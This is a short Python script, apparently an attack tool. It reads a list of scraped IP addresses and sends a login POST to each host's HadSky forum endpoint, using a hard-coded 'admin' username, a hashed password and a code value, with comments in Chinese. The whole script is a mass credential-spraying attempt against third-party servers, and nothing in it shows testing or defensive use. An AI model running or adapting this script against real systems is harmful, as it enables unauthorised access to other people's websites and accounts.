import requests

path='/index.php?c=chklogin&referer=&return=json'

postdata=data = {
            '_webos': 'HadSky',
            'autologin': '1',
            'enpw': '1',
            'code': 'f1krca5ttca4xqr65pwz97aprjxwamv7',
            'username': 'admin',
            'password': '5cc1b009487e7ce9cb8d47da5cfeedaf'
        }
for ip in open('爬取ip.txt'):
    try:
        result = requests.post(url=ip+path,data=postdata)
        print(result)
    except Exception as e:
        print("异常")
        pass